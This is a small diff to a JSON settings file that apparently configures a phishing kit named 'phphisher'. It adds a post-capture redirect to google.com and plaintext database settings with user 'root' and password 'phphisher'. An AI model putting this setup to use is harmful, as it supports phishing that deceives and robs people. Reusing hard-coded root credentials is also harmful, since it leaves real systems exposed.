@@ -1,4 +1,9 @@
 {
 	"page": 0,
-	"email": ""
+	"email": "",
+	"page-redirect": "http://google.com/",
+	"dbuser": "root",
+	"dbpass": "phphisher",
+	"dbname": "phphisher",
+	"dbip": "localhost"
 }
